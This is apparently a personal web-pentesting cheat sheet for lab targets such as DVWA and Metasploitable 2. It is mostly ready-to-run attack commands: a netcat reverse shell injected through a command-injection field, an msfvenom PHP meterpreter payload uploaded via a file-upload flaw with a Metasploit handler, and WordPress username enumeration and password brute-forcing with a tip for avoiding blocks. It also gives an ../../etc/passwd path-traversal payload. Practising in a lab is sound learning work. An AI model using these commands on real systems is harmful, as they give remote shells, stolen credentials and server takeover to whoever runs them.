
#### IDOR
```bash
We just need to add page=123 => we will get flag
```
#### Command Injection
```bash
# Reverse Shell
Open New terminal => sudo su
nc -nlvp 9696

Go back to cmd exec., 
8.8.8.8 | nc -e /bin/bash 192.168.1.9 9696

come back to NC terminal
pwd
ls
uname -a
python -c 'import pty; pty.spawn("/bin/bash")'
ls
exit

Command Execution:
If Linux
| ls "<Path>"
#once files are listed
| cat "<Path>"

If Windows
| dir "<Path>"
#once files are listed
| type "<Path>"

```

#### File Upload
```bash
Web server allows attackers to upload files to its filesystem without proper validation like name, type, contents or size. Due to this improper validation type of files getting uploaded, an attacker will be able to upload malicious files.

**Commands**
DVWA cred's =>
username - admin
passwd - password

In parrot browser > http://192.168.1.7/dvwa 
[Note :- make sure to set DVWA script security to LOW]

New terminal
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=9999 --platform php -o Desktop/upload.php

New terminal
msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.9
set LPORT 9999
exploit -j

upload the "upload.php" file in dvwa upload vuln., once file is uploaded copy the full path and in URL remove # & paste the path & hit enter
#If the process is unclear, check the below PoC
come back to msfconsole & hit enter once
sessions
sessions -i 1
	> sysinfo

[Note :- 192.168.1.7 is Meta 2 ip] [Note :- 192.168.1.9 is parrot ip]
```
#### Burpsuire
```bash
In the Browser to send the data through the Burp-suite(when intercept is on)  we have to Set the Connection Settings of the browser to Manual Proxy Configuration and HTTP Proxy = 127.0.0.1  Port = 8080 and the other(HTTP proxy and Socks Host) make them empty and click ok.

make sure intercept is on, to intercept traffice
```
#### ZAP
```bash
To open ZAP from terminal use zaproxy and hit enter.
Choose the Automated scan, enter the URL
Then Start Attack
Here Spider will crawl to directories, but sometimes it may miss some endpoints
The final results will be in Alerts
```

#### Automated Tool - Smart Scanner
```bash
 cd wapiti
 python3 -m venv wapiti3 #to create a virtual env.
 . wapiti3/bin/activate #activate virtual env.
 pip install . #to intstall wapiti web application scanner
 wapiti -u https://[targetSite]
 
 #Note: It would take 10min to complete the scan. And the final report 
 /root/.wapiti/generated_report/
 
```

#### Dirb
```bash
dirb http://<Meta2IP>

Specific search
dirb <URL> -X .txt

```
#### TO FIND THE FIREWALL USED BY TARGE
```bash
wafw00f <url>
We can use this also "http-waf-detect.nse "

```

#### WPSCAN — Wordpress sites
```bash
sudo apt install wpscan
wpscan --update -> to update the vulnerability database:
wpscan --url http://targetsite.com → To detect whether it’s a WordPress site and check for potential vulnerabilities.
User Enumeration : wpscan --url https://example/ --enumerate u
Bruteforce: wpscan --url https://example/ --passwords wordlist.txt --usernames samson

brute force attack on wordpress login:
wpscan --url http://targetsite.com --passwords /path/to/wordlist.txt --usernames admin
wpscan --url <url> -P <Passwords.txt> -U <Users.txt> 

Important Options :
`-e u   (enumerates usernames)`
`-e p   (enumerates plugins)`
`-e t   (enumerates themes)`
`-e ap  (enumerates all plugins)`
`-e at  (enumerates all themes)`
`-e dbe (enumerates database exports)`
`-e vp  (enumerates only vulnerable plugins)`
`-e vt  (enumerates only vulnerable themes)`
`-e cb  (enumerates config backups)`
`-e x   (enumerates all)`

#### Cewl
cewl -d 5 -w cewlfile.txt http:/IP/

Tips:
always update the database before scanning
use --random-user-agent to avoid being blocked

```
#### File Traversal (Directory Traversal)
```bash
Attacker tries to access restricted folders or files on the server

you can try:
dirb -u <Target>
https://example.com/view?file=images/cat.jpg

If the server is not validating the file path properly, an attacker could do:
https://example.com/view?file=../../../../etc/passwd
```

